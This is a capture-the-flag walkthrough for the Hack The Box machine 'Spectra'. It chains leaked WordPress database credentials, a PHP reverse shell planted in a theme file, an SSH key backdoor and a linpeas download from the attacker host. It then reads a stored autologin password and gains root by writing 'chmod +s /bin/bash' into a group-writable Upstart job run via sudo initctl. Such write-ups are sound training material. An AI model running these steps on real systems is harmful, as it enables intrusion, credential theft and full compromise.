# Spectra: Easy

```sh
sudo vim /etc/hosts
# add spectra.htb

nmap -T4 -p- -A -Pn -v spectra.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.1
    * 80/tcp: http: nginx 1.17.4
    * 3306/tcp: mysql: MySQL (unauthorized)

* we can try connecting to the open ```mysql``` service on port 3306 but it does not work as remote connections are not allowed

* the webpage is for 'Issue Tracking': it mentions that until Jira is set up, a temporary solution is in place for issue tracking: and two links are provided:

    * software issue tracker: 'http://spectra.htb/main/index.php'
    * test: 'http://spectra.htb/testing/index.php'

* the test page gives a 'Database Error' page with the message "Error establishing a database connection"

* the main page leads to a WordPress site titled 'Software Issue Management': the blog page does not have any interesting content as it is left in its default setup

* the only user on the blog page is 'administrator'

* web enum:

    ```sh
    feroxbuster -u http://spectra.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan with small wordlist

    ffuf -c -u 'http://spectra.htb' -H 'Host: FUZZ.spectra.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs 283 -s
    # subdomain scan

    feroxbuster -u http://spectra.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md,js --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan with medium wordlist
    ```

* the recursive scan using ```feroxbuster``` shows WordPress files for both directories: '/main' and '/testing': so these could be 2 different WP instances

* the scan gives a lot of files, but there a few non-default and interesting files that stand out:

    * /testing/wp-config.php.save
    * /testing/wp-settings.php
    * /main/wp-login.php
    * /main/wp-config.php

* while the PHP files don't display the content and give errors, the file at 'http://spectra.htb/testing/wp-config.php.save' discloses sensitive info:

    * DB name: 'dev'
    * DB user: 'devtest'
    * DB password: 'devteam01'

* also, checking the page at 'http://spectra.htb/testing/' leads to a directory listing: we can verify if there are any other secrets here

* we can try logging in into the WP login page at 'http://spectra.htb/main/wp-login.php'

* using common creds like 'admin:admin' fails with the error message 'Unknown username'

* using the creds 'devtest:devteam01' also gives the same error message

* however, if we try the password 'devteam01' for the known username 'administrator', it works and we are able to login

* the dashboard page at 'http://spectra.htb/main/wp-admin/' has a barebone view initially, but loads the design and themes after a while; we can refresh it so that the page loads up properly

* we can try to get RCE using the WordPress theme PHP file method:

    * in the dashboard, navigate to the 'Theme Editor' page at '/main/wp-admin/theme-editor.php'

    * click on the '404 Template' to edit the '404.php' page

    * here, we can copy-paste a PHP reverse shell file, modified to include the IP-port values for the listener: ensure the PHP code is pasted correctly

    * then, click on 'Update File' to push the changes

    * for some reason, we are unable to modify the files for the main theme 'Twenty Twenty'

    * we can select another theme and try the same method: this time it works

    * setup the listener for the reverse shell:

        ```sh
        nc -nvlp 4444
        ```
    
    * then, we can visit the link to the 404 page according to the modified theme: in this case it would be 'http://spectra.htb/main/wp-content/themes/twentynineteen/404.php'

* this works, and we get reverse shell:

    ```sh
    id
    # 'nginx' user

    pwd
    # '/'

    ls -la

    ls -la /home
    # there are several users - 'chronos', 'katie', 'nginx', 'root' and 'user'

    ls -la /home/nginx
    # we have a '.ssh' directory

    ls -la /home/nginx/.ssh
    # empty
    ```

* we can try to login via SSH as we have a '.ssh' directory for 'nginx' user:

    ```sh
    # on attacker

    ssh-keygen -f nginx
    # empty passphrase

    chmod 600 nginx

    cat nginx.pub
    # copy public key
    ```

    ```sh
    # in reverse shell

    echo "ssh-ed25519 ..." > /home/nginx/.ssh/authorized_keys
    # paste public key contents into the new file

    chmod 600 /home/nginx/.ssh/authorized_keys
    ```

    ```sh
    # on attacker

    ssh -i nginx nginx@spectra.htb
    # this works
    ```

* we have SSH access as 'nginx' now, but we need to pivot to other users for privesc

* checking the structure of the box shows that it is not a typical Linux target

* we have several users: 'chronos', 'katie', 'nginx', 'root' and 'user'

* we can attempt initial enumeration using ```linpeas``` - fetch the script from attacker:

    ```sh
    cd /tmp

    wget http://10.10.14.66:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    # this does not work

    bash linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.66+, Chromium OS 11.0_pre399094_p20200824-r6
    * sudo version 1.8.32
    * MySQL processes running as user 'chronos'
    * local-only listener on port 9000
    * user 'katie' is part of a non-default group 'developers'
    * 'wp-config.php' files disclose the creds 'dev:development01'
    * multiple folders found in ```/opt```

* as we have valid DB creds, we can try connecting to the MySQL DB:

    ```sh
    mysql -u dev -pdevelopment01 -e 'show databases'
    # this works
    # we have non-default DB 'dev'

    mysql -u dev -pdevelopment01 -D dev -e 'show tables'
    # we have a 'wp_users' table

    mysql -u dev -pdevelopment01 -D dev -e 'select * from wp_users'
    # this provides a single hash for 'administrator' user
    ```

* as the MySQL DB does not disclose any useful info, we can try re-using this password for other users: this does not work

* checking the folders in ```/opt``` does not give any creds, as most of them are for default installs in ChromeOS:

    ```sh
    ls -la /opt
    # check all folders and files
    ```

* however, there is a non-default config file ```/opt/autologin.conf.orig```:

    ```sh
    start on started boot-complete
    script
    passwd=
    # Read password from file. The file may optionally end with a newline.
    for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
        if [ -e "${dir}/passwd" ]; then
        passwd="$(cat "${dir}/passwd")"
        break
        fi
    done
    if [ -z "${passwd}" ]; then
        exit 0
    fi
    # Inject keys into the login prompt.
    #
    # For this to work, you must have already created an account on the device.
    # Otherwise, no login prompt appears at boot and the injected keys do the
    # wrong thing.
    /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
    end script
    ```

    * the script reads a password from two possible files: ```/mnt/stateful_partition/etc/autologin/passwd``` & ```/etc/autologin/passwd```

    * then, it injects the keys with the password into the login prompt

* we can check for any creds leftover in those two files:

    ```sh
    ls -la /mnt/stateful_partition/etc/autologin/passwd
    # file not found

    ls -la /mnt/stateful_partition/etc/
    # the directory exists, but the files cannot be read

    ls -la /etc/autologin/passwd
    # this exists and can be read

    cat /etc/autologin/passwd
    # gives password
    ```

* the file at ```/etc/autologin/passwd``` gives the password 'SummerHereWeCome!!'

* as we have another credential now, we can try to log into SSH as one of the users:

    ```sh
    ssh katie@spectra.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that the user 'katie' can run the following command: ```(ALL) SETENV: NOPASSWD: /sbin/initctl```

* Google shows that the ```initctl``` binary is used to communicate with and control the ```init``` daemon

* [GTFOBins](https://gtfobins.org/) does not have an entry for ```/sbin/initctl```, but we can Google for abusing this binary for privesc

* ```/sbin/initctl``` is used to create Upstart config files in ```/etc/init``` - we can inject malicious commands that can be executed when the service is restarted:

    ```sh
    ls -la /etc/init
    # we have several config files here
    # there are a lot of 'test.conf' files that we can check

    cat /etc/init/test.conf

    cat /etc/init/test2.conf
    # check similar files
    ```

* the test '.conf' files in ```/etc/init``` show the structure of the config files: it follows the 'script' blocks seen earlier in ```/opt/autologin.conf.orig```

* furthermore, the test '.conf' files are writable by the 'developers' group, of which we are a part of: so we can modify one of the files: we can inject a command for reverse shell one-liner:

    ```sh
    vim /etc/init/test.conf
    # inject a revshell one-liner
    ```

    ```sh
    description "Test node.js server"
    author      "katie"

    start on filesystem or runlevel [2345]
    stop on shutdown

    script

        export HOME="/srv"
        chmod +s /bin/bash
        echo $$ > /var/run/nodetest.pid
        exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

    end script

    pre-start script
        echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
    end script

    pre-stop script
        rm /var/run/nodetest.pid
        echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
    end script
    ```

* as the config file has been modified, we need to restart the service associated to trigger the command execution:

    ```sh
    # on target

    sudo /sbin/initctl list
    # list config files to check 'test' conf file is included
    # target file is in 'stop/waiting' mode

    sudo /sbin/initctl stop test
    # this gives the error "Unknown instance"

    # we can start the service directly
    sudo /sbin/initctl start test

    ls -la /bin/bash
    # this works and we have SUID bit assigned

    /bin/bash -p
    # gives root shell

    cat /root/root.txt
    # root flag
    ```
